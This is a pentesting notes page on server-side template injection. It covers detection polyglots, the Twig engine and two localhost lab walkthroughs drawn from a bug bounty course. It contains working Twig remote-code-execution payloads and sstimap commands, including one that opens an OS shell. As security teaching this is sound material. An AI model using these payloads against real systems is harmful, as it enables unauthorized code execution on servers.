---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SSTI

{% hint style="info" %}
Server-Side Template Injection (SSTI) is a vulnerability where an attacker injects malicious template code into server-side templates, which is then executed by the server.
{% endhint %}

{% hint style="danger" %}
This can lead to remote code execution, data exposure, and unauthorized access, as attackers can manipulate the server-side template engine to run arbitrary code.
{% endhint %}

{% hint style="success" %}
Validate and sanitize all user inputs, avoid using untrusted data in templates, and restrict the template engine's features to limit the potential impact of injections.
{% endhint %}

> _**Template Engines** are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client._&#x20;

## Identification

### Manual

We can use polyglots to induce errors. The **error polyglot** produces an error message to 44 template engines. However, errors might be caught by the application. The **non-error polyglots** are constructed in such a way that at least one of them does not throw an error, but renders the polyglot modified for all popular template engines.

```bash
# The error polyglot
<%'${{/#{@}}%>{{
# Non-error polyglots
">[[${{1}}]]
<%=1%>@*#{1}
{##}/*{{.}}*/
```

```
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
```

<figure><img src="../../../.gitbook/assets/ssti_portswigger_diagram.png" alt=""><figcaption><p>Figure 1: Identifying template engines (<em>image taken from</em> <a href="https://portswigger.net/web-security/server-side-template-injection"><em>here</em></a>).</p></figcaption></figure>

### Automatic

Tools like [TInjA](https://github.com/Hackmanit/TInjA), [SSTImap](https://github.com/vladko312/sstimap), and [j2ee-scan](https://github.com/PortSwigger/j2ee-scan) (Burp Pro) can automatically test for SSTI flaws by injecting combinations of special characters in template expressions (`${{<%[%'"}}%\`). Vulnerability indicators include:

* Thrown errors, revealing the vulnerability and potentially the template engine.
* Absence of the payload in the reflection, or parts of it missing, implying the server processes it differently than regular data.
* **Plaintext Context**: Distinguish from XSS by checking if the server evaluates template expressions.
* **Code Context**: Confirm vulnerability by altering input parameters. For instance, changing `greeting` in `http://vulnerable-website.com/?greeting=data.username` to see if the server's output is dynamic or fixed, like in `greeting=data.username}}hello` returning the username.

## Examples

### Twig

> _The example below is based on TCM's_ [_Practical Bug Bounty_](https://academy.tcm-sec.com/p/practical-bug-bounty) _course._

Following the methodology outlined [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#detection), we can see that we are dealing with a Twig engine (Figure 2).

```bash
# payload used
${{<%[%'"}}%\.
```

<figure><img src="../../../.gitbook/assets/web_ssti_twig_1.png" alt=""><figcaption><p>Figure 2: Using a polyglot to detecting the engine.</p></figcaption></figure>

We can also confirm that we are dealing with either a Twig or Jinja2 engine  by following the steps outlined on Figure 1 (Figure 3).

```bash
# payloads used
{{7*7}} # 49
{{7*'7'}} # 49
```

<figure><img src="../../../.gitbook/assets/web_ssti_basic_1.png" alt=""><figcaption><p>Figure 3: Testing for SSTI.</p></figcaption></figure>

To make sure that this is indeed an SSTI and not a client-side, we can view the source code and check if the result is `49` or `{{7*'7'}}`.

```html
<div>
    <hr><h3>Your message:</h3>49                </div>
</div>
```

Next, we can try any Twig-specific payload from this [list](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig) and achieve RCE[^1] (Figure 4).

```bash
# payloads used
{{['id']|filter('system')}}
{{['pwd']|filter('system')}}
```

<figure><img src="../../../.gitbook/assets/web_ssti_twig_2.png" alt=""><figcaption><p>Figure 4: Achieving RCE via an SSTI vulnerability.</p></figcaption></figure>

The above process could be automated using [`sstimap`](https://github.com/vladko312/SSTImap).

{% code overflow="wrap" %}
```bash
$ sstimap.py -u "http://localhost:81/ssti0x01.php" --data 'greeting=*' --engine twig --method POST
<SNIP>

[*] Loaded plugins by categories: languages: 5; legacy_engines: 2; engines: 17; generic: 3
[*] Loaded request body types: 4

[*] Scanning url: http://localhost:81/ssti0x01.php
[*] Testing if Body parameter 'greeting' is injectable
[*] Twig plugin is testing rendering with tag '*'
[+] Twig plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:

  Body parameter: greeting
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code

[+] Rerun SSTImap providing one of the following options:
    --interactive                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.
    --os-shell                   Prompt for an interactive operating system shell.
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port.
    --reverse-shell HOST PORT    Send a shell back to the attacker's port.
    --upload LOCAL REMOTE        Upload files to the server.
    --download REMOTE LOCAL      Download remote files.
```
{% endcode %}

### Twig (2)

> _The example below is based on TCM's_ [_Practical Bug Bounty_](https://academy.tcm-sec.com/p/practical-bug-bounty) _course._

This time when we try different payloads they just print in the page. However, when we `Edit Card` and `Save Changes`, a `POST` request is generated (Figure 5).

<figure><img src="../../../.gitbook/assets/web_ssti_twig_3.png" alt=""><figcaption><p>Figure 5: A potential location for SSTI.</p></figcaption></figure>

When we inject the payload within the `Edit Card`, it gets executed (Figure 6).

<figure><img src="../../../.gitbook/assets/web_ssti_twig_4.png" alt=""><figcaption><p>Figure 6: Performing a successful SSTI.</p></figcaption></figure>

Next, we can use `sstimap` to achieve RCE[^2] (Figure 7).

{% code overflow="wrap" %}
```bash
$ sstimap.py -u "http://localhost:81/ssti0x02.php" --data 'cardHtml=*' --engine twig --method POST --os-shell
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/web_ssti_twig_5.png" alt=""><figcaption><p>Figure 7: Achieving RCE via an SSTI vulnerability.</p></figcaption></figure>

## Resources

{% tabs %}
{% tab title="Theory" %}
{% embed url="https://hackmanit.de/en/blog-en/178-template-injection-vulnerabilities-understand-detect-identify" %}
{% endtab %}

{% tab title="Engine-specific payloads" %}
{% embed url="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" %}
{% endtab %}

{% tab title="Engine-specific payloads" %}
{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" %}
{% endtab %}

{% tab title="SSTI Table" %}
{% embed url="https://cheatsheet.hackmanit.de/template-injection-table/" %}
{% endtab %}
{% endtabs %}

[^1]: Remote Code Execution

[^2]: Remote Code Execution
